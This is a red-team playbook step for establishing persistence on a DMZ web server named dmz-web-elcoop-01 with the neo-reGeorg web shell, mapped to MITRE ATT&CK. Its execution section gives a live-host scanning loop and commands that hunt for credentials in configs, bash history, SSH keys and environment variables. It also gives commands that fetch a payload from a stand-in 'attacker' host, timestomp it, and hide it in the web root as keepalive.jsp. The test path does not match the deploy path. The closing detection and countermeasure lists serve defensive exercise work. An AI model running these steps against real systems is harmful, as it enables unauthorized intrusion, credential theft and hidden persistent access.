# Step 2: Establish Persistence – neo-reGeorg 

**Tactic**:  
- Persistence [TA0003]  

**Technique**:
- External Remote Services [T1133]  
- Web shell [T1505]
**Objective**: Establish long-term access to the compromised Web Server by configuring the system with neo-reGeorg proxy.

---

## Context
- **Target System**: `dmz-web-elcoop-01` (Web Server, DMZ)
- **Persistence Mechanism**: neo-reGeorg web shell
- **Execution Method**: Remote via compromised creds on webserver

---

## Execution

### 1. Enumerate systems and services in DMZ
Identify the subnet
```bash
ip a
```
Find live hosts and test each IP for HTTP/HTTPS (replace with subnet parameters)
```bash
for ip in $(seq 1 254); do \
  ping -c1 -W1 [Network Prefix].$ip &> /dev/null && \
  curl -sI http://[Network Prefix].$ip | grep -i "server" && \
  echo "Web server found at [Network Prefix].$ip"; \
done
  ```

### 2. Reuse compromised creds on webserver
Typical Credential Sources:
| Location      | Command                                                              | Purpose                                        |
| ------------- | -------------------------------------------------------------------- | ---------------------------------------------- |
| Web configs   | `grep -r 'password' /etc /var/www /opt`                              | Find plain-text passwords                      |
| Bash history  | `cat ~/.bash_history`                                                | Look for `ssh`, `scp`, or `sudo` commands      |
| SSH keys      | `ls ~/.ssh/`                                                         | Look for `id_rsa`, `id_dsa`, `authorized_keys` |
| Env variables | `printenv`                                                  | Sometimes creds are stored in ENV              |
| Backup dirs   | `find / -name '*bak' -o -name '*.old' -o -name '*.tar*' 2>/dev/null` | Search for archived secrets                    |

  
### 3. Deploy neo-reGeorg on webserver to establish persistence in the DMZ 
```bash
curl http://attacker/payload.jsp -o /tmp/update.jsp
chmod 644 /tmp/update.jsp
touch -r /etc/passwd /tmp/update.jsp
mv /tmp/update.jsp /var/www/html/include/keepalive.jsp
```


### 4. Test Persistence
```bash
curl -A "Mozilla/5.0" http://[serverIP]/assets/keepalive.jsp
```

---

## Result
Red Team has established persistence on `dmz-web-elcoop-01` using a SOCKS proxy. This ensures continued access post-reboot or user login.

---

## Device Paths
- **Target Host**: `dmz-web-elcoop-01`
- **Payload Location**: `[Fill in later]`

---

## Detection Opportunities
| Vector| Description|
|-|-
| Network Traffic       | Anonmlyous ssh trafic from vpn server                   |
| File Location         | Unexpected file in server path                         |

---

## Defensive Countermeasures
- Web Root File Integrity Monitoring
- Web Server Access Log Analysis
- SSH and Sudo Log Monitoring for Credential Reuse
- Egress Traffic Monitoring from DMZ Hosts
- Restrict Write Permissions to Web Root
- Detect Proxy or Tunneling Behavior
- File Timestamp Anomaly Detection
- Deploy a Web Application Firewall (WAF)